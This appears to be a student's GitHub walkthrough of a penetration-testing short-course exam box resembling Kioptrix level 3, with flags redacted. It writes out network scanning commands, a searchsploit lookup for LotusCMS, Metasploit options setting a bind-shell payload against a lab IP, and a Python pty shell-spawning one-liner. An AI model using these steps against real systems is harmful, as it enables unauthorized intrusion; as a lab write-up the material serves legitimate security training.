# charles-sturt-shortcourse-pentesting-walkthrough
IT Masters offered a free penetration testing course url: https://itmasters.edu.au/free-short-course-pen-testing/ The final exam included solving a vulnerable box which was almost identical to #kioptrix(level 3)

University Name: Charles Sturt University, Australia
Instructed by: Chantelle Hale
Co-ordinated by: Jeremy Koster
Course Name: Pentesting
To protect course integrity, I blocked all the flags and answers in the walkthrough.

## Walkthrough
<h3> Setting up the VM:</h3>
Download the image file from IT masters website: https://learn.itmasters.edu.au/course/view.php?id=3807. Then import and run!

<h3>Getting into the environment:</h3>
Run netdiscover to learn the machine IP.

`sudo netdiscover -i eth0`

![image](https://user-images.githubusercontent.com/31168741/201129984-b84d673e-b85e-4ca8-a0b3-0a9025f63421.png)

##Note:## Found out by the mac address.

Run nmap scan on the machine IP that we found.

`sudo nmap -sS -A -p- [machine-ip] -T4`

![image](https://user-images.githubusercontent.com/31168741/201187255-88db250f-8258-4a4e-bfa6-1a196839f11b.png)

We find two ports open as per the results. Port 80 and 22

Since http service is running on the machine, run nikto to scan:

`nikto -h [machine-ip]`

![image](https://user-images.githubusercontent.com/31168741/201187786-b6f4ed90-5c1b-4f57-a6f0-5e1a122c0111.png)

Just as before, letâ€™s take a deeper dive by inspecting what lies in the open port i.e. ***[machine-ip]***:80

![image](https://user-images.githubusercontent.com/31168741/201187946-6c30ca06-9420-4597-8681-5137a596ca54.png)

***Flag 1 found!***

![image](https://user-images.githubusercontent.com/31168741/201188119-372aac15-cfdd-42b8-b7de-f9789d0f4828.png)

Then, a login form. Interesting!

<h3>Exploitation</h3>
As it says, the website is using lotuscms, let's see if anything we can find on this:

`searchsploit lotuscms`

![image](https://user-images.githubusercontent.com/31168741/201188633-633edac9-7b84-46d9-ba03-485e0076a659.png)

We try the one with Metasploit:

![image](https://user-images.githubusercontent.com/31168741/201188708-f9385b85-0f54-497e-9c70-ded7dd5149e5.png)

***Setting up the options:***

`set RHOSTS 192.168.31.32`<br>
`set URI /index.php?system=Admin`<br>
`set payload payload/generic/shell_bind_tcp`<br>
`exploit`

![image](https://user-images.githubusercontent.com/31168741/201188984-5b9d3f6e-f630-4b49-aff6-d613ae45cd49.png)
![image](https://user-images.githubusercontent.com/31168741/201189609-3f503ea7-c3e7-412c-b093-44df08146237.png)

We are inside! A session has been opened.<br>
Spawn tty shell for better user interaction.

`python -c 'import pty; pty.spawn("/bin/sh")'`

![image](https://user-images.githubusercontent.com/31168741/201190021-2fbd433c-0feb-4b63-8046-843c561f6b02.png)

Run bash: `/bin/bash -i` for even better user interaction.

![image](https://user-images.githubusercontent.com/31168741/201190262-d35f9042-bf2d-491a-9073-09e0590060ce.png)

Look around for clues.

![image](https://user-images.githubusercontent.com/31168741/201190354-e607265b-63cd-4bef-8006-b0555bda9847.png)

***Flag 2 found!***

